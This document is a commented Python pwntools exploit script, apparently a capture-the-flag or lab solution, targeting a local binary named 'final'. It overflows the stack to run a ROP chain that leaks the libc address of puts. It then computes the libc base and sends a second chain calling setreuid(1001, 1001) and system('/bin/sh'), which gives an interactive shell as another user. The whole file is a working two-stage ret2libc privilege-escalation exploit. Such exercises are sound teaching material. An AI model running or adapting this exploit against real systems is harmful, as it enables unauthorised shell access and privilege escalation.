from pwn import *

# comment the one that we don't need
#context.update(arch='i386', os='linux') # this is so pwntools knows we are working in x86
context.update(arch='amd64', os='linux') # this is so pwntools knows we are working in x64

# useful locations
start = 0x400577 # address of start

elf = ELF("./final") # load our binary to find PLT and GOT
plt_puts = elf.plt.puts # the PLT location of puts
got_puts = elf.got.puts # the GOT location of puts

rop = ROP(elf) # start a rop chain
pop_rdi = rop.rdi.address # find the pop rdi gadget

# build the rop chain
rop.raw(pop_rdi) # jump to "pop rdi; ret;" gadget
rop.raw(got_puts) # pop the got puts addr into RDI
rop.raw(plt_puts) # ret to PLT puts to print contents of GOT

# start the vuln program as a  process
p = process("./final")

# attach process to gdb

# stack - this is where we can build our ROP exploit
payload = cyclic(cyclic_find('kaaa')) # padding
payload += rop.chain() # send rop chain
payload += p64(start) # after the first rop chain, just to start to send 2nd payload

# send payload
p.sendline(payload)

# recv our leaked input
print(p.recvline()) # recv the first line and print out
leak_data = p.recv(6) # recv 6 bytes of our second line, which is our puts addr
puts_addr = unpack(leak_data, "all") # unpack the leak data into an int

# developing our second payload
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so") # load the path to libc
puts_offset = libc.sym.puts # find the puts offset
libc_base = puts_addr - puts_offset # calculate the base addr of libc
libc.address = libc_base # set the libc address to the calculated base
bin_sh = next(libc.search(b'/bin/sh')) # find the addr of the string "/bin/sh"

# building our 2nd rop chain
rop = ROP(libc) # start a rop chain from libc
rop.setreuid(1001, 1001)  # set euid and ruid to 1001 (buzz) we will change this later
rop.system(bin_sh)  # call system with bin_sh as an argument
rop.exit(0) # exit 0 to cleanly exit shell

# our 2nd payload

payload2 = cyclic(cyclic_find('kaaa')) # padding
payload2 += rop.chain() # rop chain

p.sendline(payload2) # send 2nd  payload
p.interactive()
